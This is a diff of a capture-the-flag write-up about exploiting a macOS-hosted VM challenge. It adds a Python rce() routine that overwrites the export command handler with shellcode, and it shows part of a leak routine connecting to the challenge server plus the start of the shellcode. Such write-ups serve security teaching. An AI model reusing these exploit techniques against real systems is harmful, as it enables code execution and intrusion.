@@ -289,9 +289,16 @@ case 'f':
 
 Initially I was thinking about `malloc`, which should returns `null` when the size(`vm_mem + v22`) is too big, but this does not seem work and I am not sure why; then I found `atoi` works fine because `atoi("flag")` returns 0.
 
-However, even if in the same machine the offset from `vm_mem` to program base is constant, in the remote machine that offset is different from the local one. I realized this when I run this program on different MacOS machines (thanks @[PK398](https://github.com/PK398) for providing his MacOS machine that helps my analysis :D). So, I tried to brute force to find the correct offset.
+However, even if in the same machine the offset from `vm_mem` to program base is constant, in the remote machine that offset is different from the local one. I realized this when I run this program on different MacOS machines (thanks @[PK398](https://github.com/PK398) for providing his MacOS machine that helps my analysis :D). So, I tried to brute force to find the correct offset.The method to execute shellcode is same as the technique used to modify `"honcho"` global string, but this time we change the codes in handler of `export` command (this is chosen because codes here are long, so less likely to rewrite something that should not be modified). 
 
 ```python
+def rce(sh,shellcode):
+	export_handler = 0xC43
+	export(sh, str(7) * l, 'A' * (l+1+3) + p16(export_handler))
+	export(sh, '8' * l, (val_len(l) - (l+1) - 2) * '8' + '$' + '7' * l)
+	no_zero(shellcode)
+	export(sh, '0' * l, shellcode)
+	sh.send("export ")
 def leak_prog(off):
 	sh = remote("rtooos.quals2019.oooverflow.io", 5000)
 	img_addr = (-(0x7966a)+off) & 0xffffffffffffffff
@@ -340,7 +347,7 @@ Even if the offset is different, they don't seem to differ a lot according to my
 
 Finally, I found the `i` to be `-0x13`.
 
-Then it is time to write shellcode! The method is same as the technique used to modify `"honcho"` global string, but this time we change the codes in handler of `export` command (this is chosen because codes here are long, so less likely to rewrite something that should not be modified). Here are the shellcode:
+Then it is time to write final shellcode!
 
 ```assembly
 mov rdi,atoi_got
